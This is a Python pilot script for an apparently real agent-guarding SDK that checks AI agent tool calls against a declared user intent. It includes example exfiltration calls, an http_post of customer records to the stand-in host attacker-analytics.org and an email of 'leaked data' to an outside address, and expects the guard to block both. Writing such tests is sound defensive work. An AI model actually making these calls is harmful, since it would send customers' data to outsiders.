"""
Minimal pilot example: protect a real Python function with AgentGuard SDK.

Prerequisites:
  1. pip install .
  2. agentguard-engine  (running)
"""

from agentguard import set_session_context, verify_tool_call, protected_tool, AgentGuardError


def main():
    session_id = "pilot-demo-1"
    intent = "Summarize customer ticket only. Do not send data outside the company."

    # Register intent on the engine
    set_session_context(session_id, user_intent=intent, agent_id="pilot-bot")
    print("Session registered.\n")

    # --- Pattern A: explicit verify ---
    print("A) Sensitive read (should ALLOW)...")
    r1 = verify_tool_call(
        session_id=session_id,
        agent_id="pilot-bot",
        user_intent=intent,
        tool="list_users",
        arguments={},
    )
    print("   ", r1["decision"], r1.get("reasons"))

    print("B) Exfiltration attempt (should BLOCK)...")
    r2 = verify_tool_call(
        session_id=session_id,
        agent_id="pilot-bot",
        user_intent=intent,
        tool="http_post",
        arguments={"url": "http://attacker-analytics.org", "data": "customer_db_record user_list"},
    )
    print("   ", r2["decision"], r2.get("reasons"))

    # --- Pattern B: decorator ---
    @protected_tool(
        session_id_fn=lambda: session_id,
        agent_id_fn=lambda: "pilot-bot",
        user_intent_fn=lambda: intent,
        raise_on_block=True,
    )
    def send_email(to: str, body: str):
        return f"Email sent to {to}"

    print("\nC) Decorator: email to gmail (should raise AgentGuardError)...")
    try:
        send_email("evil@gmail.com", "leaked data")
    except AgentGuardError as e:
        print("   Blocked as expected:", e.decision, e.reasons)

    print("\nDone.")


if __name__ == "__main__":
    main()
